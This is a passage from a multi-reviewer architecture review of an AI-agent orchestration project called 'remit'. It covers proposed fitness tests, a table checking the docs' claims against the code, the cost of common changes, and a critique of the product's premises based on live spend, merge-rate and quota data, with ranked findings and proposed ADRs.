5. **No mutable package state:** a package-level `var` assigned inside any function body fails, as does an exported mutable slice. 1 h.
6. **Clock:** no `time.Now`/`time.Since` outside an allowlist (`agent/codex.go:117`). 15 min.
7. **Race list:** fail if a `PLAIN_PKGS` package's files contain a `go` statement. 20 min.
8. **Style literals:** a vitest that bans hex, rgb, hsl and oklch literals, `font-family` without `var()`, and `box-shadow` without `var()` outside `style.css` and `theme.css`. Fix `AgentLanes.vue:382` first. 30 min.
9. **Size budget:** functions over 80 lines or files over 800 lines fail, with a baseline. 45 min.
10. **Pre-migration backup exists:** a store test opens an older database and asserts the snapshot file was written (pairs with O3). 1 h.
11. **ADR links resolve:** every `Enforced by:` names an existing test. 20 min.
12. **`make verify-ui`:** screenshots every `web/verify` page and fails on console errors. This takes 30-60 s, so it stays outside `make test`. 2 h.

#### 6) Stress-test

- **"This is single-user, so SRE machinery is overkill."** Agreed. `01-sre-principles.md` says teams under about 20 should internalize the principles, and `03-observability.md` says to defer heavy tooling below 100 rps on one instance. So I propose no Prometheus, OTel or tracing; the events table already acts as the trace. What I propose is a probe, a watchdog that writes an inbox item, and JSON logs.
- **"AI reads AGENTS.md every session, so prose works."** Evidence supports this today: zero hex literals, zero raw `time.Now`, a clean import graph. But that is about 3 days of history. Under `10-falsifiability.md`: if F1-F9 never fire in 60 days they cost a few seconds per run, and each one lets a line of AGENTS.md shrink.
- **"A release step slows the owner's dogfooding loop."** True. `make release` keeps it to one command. If the owner rejects that, the minimum is a vcs stamp plus the `previous` binary.
- **Assumptions:**
  - The pm2 dump and ecosystem file are the live deployment. HIGH: both agree.
  - The spend numbers come from the 12:12 backup copy, not the live database.
  - Test-suite duration is unknown because I was not permitted to run the tests.

#### 7) Coverage

- **Read:** all of AGENTS.md; design.md lines 1-70, 112-141 and 747-767; the Makefile; README; `main.go` lines 40-290; and the key parts of `health.go`, `budget.go`, `usage.go`, `migrate.go`, `store.go`, `kpi.go`, `convert_test.go` and `replay_test.go`.
- **Measured by script:** line and test counts for all 22 Go packages, plus web test counts (54 test files; 27 of 90 top-level components have tests).
- **aio articles read in full (14):** foundations 05, 06, 11; ops 01, 02, 03, 06, 11, 12; resilience 01, 14, 15; margin-of-safety; falsifiability.
- **Skipped and not cited** to fit the word budget: ops 04, 05, 07, 08, 09, 10; resilience 08; distributed-systems 10. I did not check "component root sets no outer margin" or the animation rule.

##### Critical Files for Implementation
- Makefile
- internal/store/migrate.go
- cmd/remit/main.go
- internal/rpc/replay_test.go
- internal/outcomes/kpi.go

---

## Appendix 7: Changeability by AI agents and documentation truth (reviewer 7 of 8)

1. **Verdict**

- **Code quality is high.** Most of what the docs say about the code is true: I checked 42 claims and 30 are true. There are no TODOs and no commented-out code. Five tests already keep docs and code in step.
- **The cost of change is not protected.** Lists of kinds (chain origins, roles, providers) are checked with strings and `if`, so the compiler cannot find a missed place. Adding two origins in `ca60e61` already missed two UI label sites.
- **`orch` is too big for one session.** It is 76 files and about 829 KB (~207k tokens), and its package doc describes what it was three days ago.
- **AGENTS.md costs more than it returns.** It is 27.3 KB, about 64% of it is general harness behaviour, some rules contradict each other, and a peer session is growing it right now against its own "keep this file small" rule.
- **The "run `make test` before every commit" gate fails** whenever another session has an uncommitted contract change, and one is in the tree now.

2. **What is genuinely good (keep it)**

- **Enum parity test** between `model` constants and the contract: `internal/rpc/convert_test.go:255`. A contract field with no matching record field is also caught: `convert.go:8-10`. (HIGH)
- **Manual-versus-tools test**: `assistant_library_test.go:72`. This is the template for doc-truth tests. (HIGH)
- **The `step` invariant holds.** All 7 places that set a chain's status are in `step.go` (`rg '\.Status *= *model\.Chain'`). (HIGH)
- **Package graph is acyclic.** The leaf packages (`library`, `outcomes`, `provider`) are pure (`go list`), and all 16 packages have a package doc. (HIGH)
- **Almost no slop.** `rg '\b(TODO|FIXME|HACK|XXX)\b'` finds 0 hits in Go and web. There is 0 commented-out code and 1 colour literal (`AgentLanes.vue:382`). Only 8 functions have no caller, all ACP interface stubs (`agent.go:366+`). (HIGH)

3. **Doc-to-code truth table** (T = true, F = false, S = stale, U = unverifiable)

| # | Claim | V | Evidence |
|---|---|---|---|
|1|`step` is the one pure transition, in step.go|T|step.go:288; every status write is in step.go|
|2|`admit` in admit.go|T|admit.go:62|
|3|`chooseCmd`/`startFrom`, "the one place a chain takes a playbook"|T|step.go:63, lifecycle.go:128; callers lifecycle.go:86,90, step.go:297|
|4|`playbookChoices`|T|capabilities.go:159|
|5|`goalHeading`|T|prompts.go:43 (an unknown origin silently becomes "from the owner")|
|6|`chainCheckBackNow`|T|rpc/api.go:111→checkback.go:156|
|7|Flags `-budget -daily-budget -max-concurrent -scout-every -autonomous`(on) `-max-dispatchers`(2) `-assistant-model -secret-key-file -claude-config-dir -codex-rates`|T|cmd/remit/main.go flag calls|
|8|`ownerWaits`|T|model.go:84|
|9|Stall: 10 min, 3 nudges|T|schedule.go:411-412|
|10|Chair tool list (design.md:140-141)|S|omits `ask_human` (tools.go ~612)|
|11|`askTools`|T|policy.go:72|
|12|check_back between 1 min and 7 days|T|checkback.go:19-20|
|13|At most 3 proposals; same title refused for 7 days|T|schedule.go:392, dispatcher_tools.go:137|
|14|Goal judge: 20 min, 3 refusals|T|goal.go:32, :28|
|15|`Card.OnTeam` = hired or seeded|T|model.go:320|
|16|Hard cap 1.25×|T|budget.go:9|
|17|`cardShown` at most 1/s; views every 200 ms; disconnect at 512 behind|T|stream.go:96, views.go:164, broadcast.go:17|
|18|`TestASecondChannel…` tests|T|rpc/channel_test.go:77,164|
|19|`EnsureAssistant`, `changeAssistant`, `lockHome`|T|assistant.go:35,104; drafts.go:102|
|20|`leadAssistant`|F|real name is `assistantLeadFor`, assistant.go:257|
|21|Assistant starts a new session past 85% context|T|assistant.go:314|
|22|Routine minimum 5 min; `Tick`, `startDueRoutines`|T|routine.go:27,351; schedule.go:229|
|23|Webhook body 1 MiB / keep 64 KiB / 503 past 100 pending|T|webhook/handler.go:28; orch/webhook.go:32,34|
|24|The 32 DecisionKinds|T|define.ts:58-90|
|25|`provider.Cannot` is "one fact read three times"|F|a fourth reading with the opposite default: `runsClaudeCode` access.go:94|
|26|"nothing reads role text any more"|F (MEDIUM)|outcomes.go:105,191 compare "reviewer"/"qc"/"judge"|
|27|Codex `reasoning_effort=high`|T|agent/codex.go:21|
|28|List items numbered once each|F|"11." appears twice, design.md:266,269|
|29|Calls: socketrpc-gen + zishang520; generated files committed|T|go.mod:10-12; internal/wire|
|30|Calls: `modernc.org/sqlite`, MCP go-sdk|T|go.mod:9,14|
|31|Calls: `Hire` does not validate cwd|T|tools.go:91-93|
|32|Calls: "owner's token file is readable by every agent"|S|README.md:19 "there is no token"|
|33|Calls: Codex home denies `SecretReads` and the vault's `secret/`|T|codexhome.go:23,37|
|34|Calls: failover recap says to read git status/diff|T|failover.go:247|
|35|Calls: a failed-over card never moves back|U|claim of absence|
|36|Calls: Codex steering changed a running turn|U|measured behaviour|
|37|Calls: shell commands not limited to cwd|U|consistent with design.md:199-200|
|38|Calls: `finish_chain` refused while the owner has an open question|T|goal.go:381|
|39|AGENTS: tools live in tools.go|S|tools are registered in 11 files (`rg -l mcp.AddTool`)|
|40|AGENTS: "the owner's token"|S|AGENTS.md:102; also auth/firebase.go:1|
|41|AGENTS: `superpowers:systematic-debugging`|U|not installed on this host|
|42|AGENTS (uncommitted): `docs/adr/`|F|the directory does not exist|

Stale items ranked by damage (worst first): #32 (security doc misstates the threat), `orch.go:1-3` package doc (wrong map for every session entering orch), #39, #10, #25, #26, the specs' line numbers (rename spec says tools.go:407, actual 478), #20.

4. **Cost of change**

| Change | Files touched by hand (+ generated) | Caught by compiler/tests? | Written down? |
|---|---|---|---|
| New chain origin | define.ts:17, model.go:59, the entry point, prompts.go:44, lifecycle.go:88 and :119, SchedulePill.vue:15, ChainList.vue:75, design.md:75 → **9 (+2)** | Only the model↔contract constant (convert_test:255). The switches and UI labels are not caught. **`ca60e61` missed both UI labels.** | No |
| New Decision kind | define.ts:58, model.go:485, the emitter, orch/outcomes.go:43, outcomes.go:287, CardDecisions.vue:14 (a `Partial` map), design.md:83 → **7 (+2)** | Parity test only | Kind list only |
| New capability/tool | capabilities.go (constant, catalog entry, its hand-written list of tools, `has()` block), a `*_tools.go`, playbooks.go, design.md:654 → **4-5** | capabilities_test.go:212, plus the manual test for Assistant tools only | Partly (AGENTS.md:21, already stale) |
| Third provider | provider.go:16,57; dialect.go:28 (interface returns `*codexSession`, dialect.go:19); agent.go:387; access.go:94; cmd agents.go:33-71; main.go flags; a home like codexhome.go; design.md Providers → **9-10** | Nothing (string constants and `if`) | No |

5. **Ranked findings**

- **A7-1 HIGH — `make test` gate fails in multi-session use.**
  - Evidence: `test: check-gen`, and check-gen runs `git diff --exit-code` (Makefile:16-18,30). define.ts and types.generated.go are dirty now, and AGENTS.md:294 says peers' dirty changes are normal.
  - Article: mental-models vol-3/16 multiplying-by-zero.
  - In 6 months: sessions skip the gate or commit peers' work.
  - Fix: move check-gen to CI or pre-push on a clean tree, or regenerate into a temp directory and compare with the working files.
  - Confidence: HIGH on the mechanism, MEDIUM on the impact (I did not run it).
- **A7-2 HIGH — kinds are not checked for completeness, and the UI computes labels the server should own.**
  - Evidence: SchedulePill.vue:15 says "from you" for routine and webhook chains; ChainList.vue:75; prompts.go:50 default; ChainActions.vue:27-30 derives actions from status, while agents get theirs from the server (design.md:537).
  - Article: vol-01/06 fitness-functions.
  - Fix: the server sends the origin label and the available chain actions; turn on golangci `exhaustive` (the tool is at /usr/local/bin); a test loops over every origin.
  - Confidence: HIGH (the UI symptom is MEDIUM, not rendered).
- **A7-3 HIGH — AGENTS.md is too large and some rules conflict.**
  - Size: 336 lines / 27,333 B. About 17.4 KB is harness behaviour, with 21 harness-tool mentions; Codex reads AGENTS.md too. Uncommitted diff: +24/−3, against AGENTS.md:317.
  - Conflicts: "5 tool calls → hand off" (:186) against Ownership (:245). "Do the larger change… improve the pattern for all" (:41,55) against "keep the scope" (:138). "Propose before executing" (:129) plus the halt-in-every-mode disagreement gate (:224) blocks every design improvement in autonomous runs.
  - Articles: vol-10/02 ai-native ("context window economics", "prompt changes are code changes"); vol-01/12 cognitive-load.
  - Fix: §6. Confidence: HIGH.
- **A7-4 HIGH — the docs have no fitness function.** Evidence: the §3 S/F rows; the agent-library spec has no Status line and describes a `gateRole` that no longer exists. Fix: a test, modelled on assistant_library_test.go:72, that resolves every backticked identifier in design.md and AGENTS.md (with an allowlist for "Left out"); no `file:line` in living docs; a required `Status:` line in specs. Confidence: HIGH.
- **A7-5 MEDIUM — orch is larger than a context window.**
  - Changing the Chair lifecycle needs about 352 KB (~88k tokens) of reading first: AGENTS 27K, design 87K, 10 core files 164K, model.go 37K, 3 tests 36K.
  - tools.go mixes domain actions with `serverFor`, the per-role tool registry (301 lines). schedule.go mixes Tick, Propose, stall checks and the Scout.
  - Article: vol-02/02 modular-monolith ("boundary enforcement is the product").
  - Fix: an `orch/doc.go` map from concern to files; one data table of tools per role; move routines and webhooks/door/precondition into their own packages (they already have their own store files).
  - Confidence: MEDIUM.
- **A7-6 MEDIUM — the same rule is implemented twice.**
  - `Propose` (schedule.go:374) is a near-copy of `startFromDelivery` (dispatcher_tools.go:97). The copy arrived in `ca60e61`, which has an empty commit body.
  - Roles have two vocabularies: Signs review/qc/goal against Role reviewer/qc/judge (gate.go:30-32, goal.go:35, outcomes.go:105; `role: string` at define.ts:701).
  - `orDefault` exists twice (main.go:285, lifecycle.go:340) and reinvents `cmp.Or`.
  - Fix: merge the two, add a typed Role enum, and add the duplicates to the parity test. Confidence: HIGH.
- **A7-7 MEDIUM — there is no record of why.**
  - Commits b1a0e7b, ca60e61 and 149b0da change 63k, 18k and 13k lines; AGENTS.md:67 relies on blame to explain code before deleting it.
  - Decisions live in three places: "Calls made by the builder" (edited in place), `docs/superpowers/specs`, and the new `docs/adr`.
  - Article: vol-01/11 ADR (immutable, numbered, linked from code).
  - Fix: one `docs/decisions/`. Confidence: HIGH.
- **A7-8 MEDIUM — the "no shims for what was never released" rule (AGENTS.md:63) is contradicted by 30 migrations and at least 10 runtime branches for old records** (model.go:83,269,378,524; lifecycle.go:165; standing.go:161; archive.go:60). Hanlon's razor: the owner runs on real data, so the rule is wrong, not the code. Fix: change the rule to "migrate forward once; runtime code reads one shape", then delete those branches. Confidence: HIGH.
- **A7-9 LOW — prose rules that should be code:** status is set only in `step` (an AST test; the parser is already at convert_test:224), the pure core imports no I/O, `make lint` with deadcode, a byte budget for AGENTS.md. Article: vol-01/06. Confidence: HIGH.

6. **Proposed restructure**

- **AGENTS.md (≤10 KB, any vendor):** what this is; Agent-centric; Build to last; Architecture; done-criteria per layer (Go: `make test lint`; contract: `make gen`; UI: verify page plus screenshot); where to change (pointer to `orch/doc.go`); decisions (pointer to `docs/decisions/`).
- **CLAUDE.md:** `@AGENTS.md` plus the Claude-harness rules (AskUserQuestion, Monitor, ToolSearch, subagent prompt format, multi-session). Or move these to the owner's user-level file.
- **`web/AGENTS.md`:** Look at what you build, styling, accessibility.
- **`internal/orch/doc.go`:** a map of concerns to files and change recipes, each recipe backed by a test.
- **`docs/decisions/NNNN-*.md`:** immutable ADRs. "Calls made by the builder" moves there. A spec becomes an ADR plus a design.md section, then is deleted.
- **Rules that become tests:** the doc-symbol test, AGENTS.md byte budget, step-only status, `exhaustive`, pure-core imports, and check-gen moved out of `test`.

7. **Stress-test of my recommendations**

- **Gall's law and modular-monolith mistake #4 (splitting too early):** there are 57 commits in 4 days and a rename is pending (rename spec, `Status: draft`). Splitting orch now may cut along seams that will move. So add the map and the tool table first, and split only routines and webhooks.
- **The doc-symbol test may get noisy.** If it fails often it will be bypassed (fitness-functions #4). Keep it to backticked identifiers.
- **Moving harness rules out may lose them** on hosts without the user-level file. CLAUDE.md keeps them for Claude sessions.
- **Hanlon's razor:** the giant commits may come from one commit sweeping a shared working copy, not from carelessness. The fix is about process, not people.
- **Assumptions:** that sessions read design.md in full (AGENTS.md:3 invites it), and that multi-session dirty trees will continue.

8. **Coverage**

- Read in full: AGENTS.md (committed version plus the uncommitted diff), design.md.
- Read in part: about 25 of 76 non-test orch files, plus the agent, provider, rpc, store, model, cmd and 6 web files.
- Not run: `make`, `deadcode`, golangci (they would write to the build cache), and no UI rendering.
- Articles read in full: fitness-functions, ADR, cognitive-load.
- Read in part: ai-native (lines 100-209), modular-monolith (core, when-to-use, mistakes, insights), and the mental models map-is-not-territory, Gall's law, incentives, multiplying-by-zero.
- Not read: 01 complexity, 05 evolutionary, 07 deep-vs-shallow, 10 vertical-slice, 12 composable, emergence, circle-of-competence, narrative, Hanlon (applied from AGENTS.md:264).

##### Critical Files for Implementation
- AGENTS.md
- Makefile
- internal/rpc/convert_test.go
- internal/orch/tools.go
- web/src/components/SchedulePill.vue

---

## Appendix 8: Red team on the premises (reviewer 8 of 8)

I applied all 17 mental models and 7 architecture articles you assigned, read in full. For each claim I give the article path and line. `MM` = `/tmp/aio-advisor-src/repo/plugins/aio-advisor/skills/aio-mental-models/` and `SA` = `/tmp/aio-advisor-src/repo/plugins/aio-advisor/`. Live figures come from the running instance's database, `~/.remit/remit.db`, opened read-only with `immutable=1`; that mode can miss the last few minutes of writes.

#### 1. Verdict

1. The engine is well built: a pure `step` function (`internal/orch/step.go:288`), transactional message queuing, an append-only usage ledger and rails that stay in code. The product premise around it has not been tested, and the first real data goes against it.
2. Live data after 3.5 days: 61 draft MRs opened, 8 merged, 1 closed, **52 waiting**. Spend is **$1,126.07**, which is **$141 per merged MR all-in**. 83% of spend ($933) is work the system gave itself (Scout runs plus the chains they proposed). That work produced 6 merges and 43 open MRs.
3. Two constraints actually limit output: how fast the owner reviews, and vendor quota. The design controls neither. Admission only checks USD spent, free slots and whether a provider is up (`internal/orch/admit.go:72-80`).
4. The design grew faster than its evidence. In 4 days it gained 30 schema migrations and commits of up to 24,872 hand-written lines. Some features have never been used (`routines`: 0 rows).
5. If nothing changes, it fails by flooding its only reviewer while its dashboard says things are fine.

#### 2. Premise table

| Premise | Evidence for | Evidence against | What would falsify it | Confidence |
|---|---|---|---|---|
| AI works end to end and the owner only reviews and merges (`docs/design.md:9-11`) | 8 merged MRs; 30 of 33 decision kinds have occurred | 52 of 61 MRs undecided; 109 agent-error inbox items; the owner typed "Remit restarted… Please resume" (`requests` table, `SaveDraft`) | Weekly decided ÷ produced ≥ 0.8 and zero hand-typed resumes for 4 weeks | LOW |
| More MRs means more value | Gates exist (`docs/design.md:283-296`) | About 20 MRs/day produced against about 3/day decided | Median age of open MRs under 2 days at steady state | LOW |
| USD is the right unit for the spend rail | Usage ledger (`docs/design.md:202-210`) | 59 rate/session/weekly-limit errors; weekly limit hit 2026-10-26 16:14; default daily cap $10,000 (`cmd/remit/main.go:54`) against about $450/day actually spent | Quota outages under 1% of hours | LOW |
| Judgement is best tuned in briefs (`AGENTS.md:27-28`) | The Chair handles 30 decision kinds | No behavioural evals: prompt tests only check that strings are present (`internal/orch/prompts_test.go:171-200`) | A replay set shows brief edits move judge and merge rates measurably | MEDIUM |
| Configure by talking to an agent (`AGENTS.md:18-20`) | 20 `PromptAssistant` calls in 26 h | `routines` 0 rows, `changes` 1; the Assistant runs on `gpt-6-astra` right now, so it has no manual (`docs/design.md:742-743`) | At least 90% of configuration requests done right first try | MEDIUM |
| Provider failover keeps work going | 265 of 662 cards ran on Codex | 39 "codex-acp cannot apply this card's tool list" errors in the inbox | Zero refused loadouts per week | LOW |

#### 3. Five likely causes of failure within 12 months (`MM/volume-1-general-thinking/07-inversion.md:171-175`)

1. **Review flood.** Signal: 52 open MRs, the oldest last updated 2026-10-24; the Scout runs hourly and may propose up to 3 chains per run (`cmd/remit/main.go:55`, `docs/design.md:101`). Test: weekly decided ÷ produced and the age of open MRs. *HIGH*
2. **Vendor quota or terms hit zero.** Agents run on the owner's own Claude Code login (`docs/design.md:69`). At 12:44 there were 0 `claude-agent-acp` processes and 5 `codex-acp`, and Codex cannot run skills or tool lists (`docs/design.md:690-693`). Test: share of hours in an outage, and refused loadouts per week. *HIGH on the signal, MEDIUM on the outcome*
3. **Spend without results, hidden by flattering metrics.** `cost-per-merged` counts only the merged chains' own cost (`internal/outcomes/outcomes.go:249,253`), giving **$8.25** against **$141** all-in. `merge-rate` and `owner-wait` leave out waiting MRs (`internal/outcomes/kpi.go:121,127`), so merge rate reads 89% while 85% of MRs are undecided. Test: all-in $/merged against what the owner's own time would cost. *HIGH*
4. **The system outgrows one owner's ability to understand and run it.** `b1a0e7b` added 24,872 hand-written lines plus 20,319 test lines in one commit; there are 30 migrations (`internal/store/migrate.go:342-365`) and 13+ manual backups in `~/.remit`. Test: median commit size and how many restarts need a manual resume. *MEDIUM*
5. **Silent regressions in prompts lead to noise.** There is no evaluation harness (`rg` for promptfoo, golden or eval found nothing). Test: replay 30 recorded chains for each brief version. *MEDIUM*

#### 4. Second-order effects of each principle (`MM/volume-1-general-thinking/05-second-order-thinking.md:112-125`)

- **No forms, talk to an agent.** First order: there is less UI to build. Second order:
  - Configuration quality depends on whichever model the Assistant happens to be on; today that is Codex, without its manual.
  - Bulk edits and diffs need a tool for every operation (79 distinct MCP tool names).
  - When no provider is up, nothing can be configured.
  - The audit trail exists only from migration 28 onward (`changes`: 1 row).
- **Judgement in briefs, not code.** Behaviour can't be reproduced, so nothing stops it getting worse. Built-in briefs are Go strings (`internal/orch/playbooks.go:87-93`) that the Playbook author can also rewrite at runtime, so a brief's current behaviour has two sources.
- **"Code is cheap / no v1 for now" (`AGENTS.md:40-41`).** Writing code is cheap; reviewing it, migrating data and understanding it are not.
  - Nobody can review a 7,436-line product commit (`ca60e61`).
  - Right now there are 52 uncommitted entries (39 modified, 13 untracked; +1,211/−569 lines). The "run `make test` before every commit" agreement (`AGENTS.md:160`) does not keep changes small.
  - The approach violates `SA/volume-01-foundations/05-evolutionary-architecture.md:13`, which warns against big-bang rewrites.
- **The server owns all state, drafts included.** There were 256 `SaveDraft` calls against 25 sends in 26 h. That machinery serves channels that don't exist yet (`docs/design.md:505`). For one user it buys durability at the cost of latency and code, and it is reversible later.
- **Coupling to one vendor's protocol.** Claude Code and ACP specifics appear in 26 of the 76 `internal/orch` files. Leaving would mean rewriting the deny rules, transcript reading, background-task handling and the library. The exit cost is high, and the second provider can't even carry the loadouts.

#### 5. Ranked findings

- **P1-1 Critical. No balancing loop on review capacity.** `internal/orch/admit.go:72-80`; the Scout checks open MRs only to avoid duplicates (`internal/orch/playbooks.go:87,91`). Models: `MM/volume-3-systems-mathematics/03-bottlenecks.md:118-123` (pace work to the bottleneck), `01-feedback-loops.md:152-157`, `SA/volume-02-architecture-styles/04-event-driven.md:367` (consumer lag is your SLO). Recommendation: a work-in-progress cap on owner-waiting MRs inside `admit`. *HIGH*
- **P1-2 Critical. Value metrics leave out the failures.** `internal/outcomes/kpi.go:121,127,138` and `internal/outcomes/outcomes.go:249`. Models: `MM/volume-1-general-thinking/01-map-is-not-territory.md:98`, `MM/volume-4-economics-art/05-incentives.md:111-114`. Recommendation: divide all spend by merges, and count waiting MRs. *HIGH*
- **P1-3 High. The rail is set far above real spend.** Defaults are $10,000/day and $1,000/chain (`cmd/remit/main.go:48,54`) against about $450/day observed. Model: `05-margin-of-safety.md:136`. Recommendation: default to about 1.5× observed spend. *HIGH*
- **P1-4 High. Quota is the factor that can go to zero, and nothing budgets it.** 59 quota errors; the weekly limit was hit. Model: `16-multiplying-by-zero.md:36`. Recommendation: make quota windows part of admission and of provider health. *HIGH*
- **P1-5 High. Failover can't carry the library.** 39 refusals; `docs/design.md:690-693`. Model: `SA/volume-01-foundations/02-trade-off-analysis.md:83` (fallback paths are rarely exercised). Recommendation: either make the loadout portable or stop failing over cards that hold one. *HIGH*
- **P1-6 High. No evaluation harness for briefs.** `internal/orch/prompts_test.go`. Model: `SA/volume-10-modern-paradigms/02-ai-native-architecture.md:186-187,198`. Recommendation: build a replay set from the 114 recorded chains. *HIGH*
- **P1-7 High. Features were designed whole instead of grown.** Routines 0, review threads 3, webhooks 1, credentials 9 (all cancelled), `ReviewSend` 0 in 26 h. Models: `10-galls-law.md:14`, `13-diminishing-returns.md:148-151`. Recommendation: freeze new entities and track usage. *HIGH*
- **P1-8 Med. Commits are too large to review.** Data above. Model: `SA/volume-01-foundations/05-evolutionary-architecture.md:117`. Recommendation: fitness functions such as a cap on product lines per commit. *HIGH*
- **P1-9 Med. The library and capability system is plugin machinery without plugin isolation.** `docs/design.md:755-758`; skills attached per card average 0.0–0.2 against 118 imported. Model: `SA/volume-02-architecture-styles/06-microkernel.md:280,329`. *MEDIUM*
- **P1-10 Med. Vendor specifics are spread through the core.** 26 of 76 files. Recommendation: confine them to `internal/agent` behind a capabilities interface. *MEDIUM*

#### 6. Proposed ADRs

**ADR-1: Admission bound by review capacity.** You asked for work around the clock, but a review-capacity limit is better because output equals your decision rate (8 of 61).
- Options:
  - (a) Keep things as they are: the backlog grows by about 17/day.
  - (b) A hard cap N on open owner-waiting MRs. It holds queued starts, the Scout and routines; the owner's own actions still pass.
  - (c) An adaptive cap = k × your 7-day decision rate.
- Consequences: (b) means less throughput but no rot, and it reuses the existing "held, and why" display.
- **Recommendation: (b) now with N=5, then (c).**

**ADR-2: Measure value honestly and budget the scarce resource.**
- Options:
  - (a) Keep the current KPIs.
  - (b) Use all-in $/merged, an undecided share, and the age of open MRs including waiting ones. Admission respects quota windows, and the default daily cap tracks observed spend.
- Consequences: (b) makes the dashboard look worse but true, and it gives the analyst real targets.
- **Recommendation: (b).**

**ADR-3: Grow from the working core.** You asked for "the larger change, no v1", but small steps in delivery are better while design stays whole, because review, migration and understanding are the scarce inputs.
- Options:
  - (a) Keep going as now.
  - (b) A moratorium on new entities until P1-1 and P1-2 targets hold for 4 weeks, plus commit-size and migration fitness functions and a brief replay harness.
  - (c) Delete routines and webhooks now.
- Consequences: (c) breaks Chesterton's fence, since they were built yesterday.
- **Recommendation: (b), and review usage-based deletions at day 30.**

#### 7. Stress test with the opposing models

- **Small sample** (`MM/volume-1-general-thinking/06-probabilistic-thinking.md:108-112`): 3.5 days is dogfooding while the product is being built. The owner may be busy building rather than reviewing, so the decision rate could rise.
- **Critical mass** (`MM/volume-3-systems-mathematics/08-critical-mass.md:162-168`): judging the value too early risks "giving up too early".
- **Cost may be notional:** USD may be list price billed against a subscription. That weakens finding 3 but strengthens finding 2.
- **Gall's law partly holds:** a working core loop existed by `8e7533b` on day 1, so growth did start from something simple, just very fast.
- **Commit sizes are inflated** by tests and generated files; I separated those out above.
- **What survives all of this:** an unthrottled producer feeding one human is structural, not a matter of sample size. P1-1 to P1-3 stay HIGH; P1-7 drops to MEDIUM.

#### 8. What not to break (Chesterton's fence)

- The pure `step` function and one writer per chain.
- Message queuing in the same transaction (`docs/design.md:149-151`).
- The append-only ledger.
- Gates tied to a patch id, and a goal judge outside the team it judges (`docs/design.md:283-296`).
- Outside text treated as evidence, never instruction.
- Draft-only MRs that are never merged.
- Admitted gaps written down honestly (`docs/design.md:747-780`).
- The fact that an Outcomes package exists at all: fix its denominators, keep the package.

**Coverage:**
- Read in full: `docs/design.md` (781 lines) and `AGENTS.md`.
- Read in part: `internal/outcomes/kpi.go`, `internal/orch/admit.go`, `internal/orch/prompts_test.go`.
- Checked with `rg`: `internal/orch/playbooks.go`, `internal/outcomes/outcomes.go`, `internal/store/migrate.go`, `cmd/remit/main.go`.
- Not reviewed: the other 70 orchestrator files and the web components.
- Live DB: 19 of 24 tables counted. Git: all 57 commits. Working tree: not modified.

##### Critical Files for Implementation
- internal/orch/admit.go
- internal/outcomes/kpi.go
- internal/outcomes/outcomes.go
- cmd/remit/main.go
- internal/orch/playbooks.go
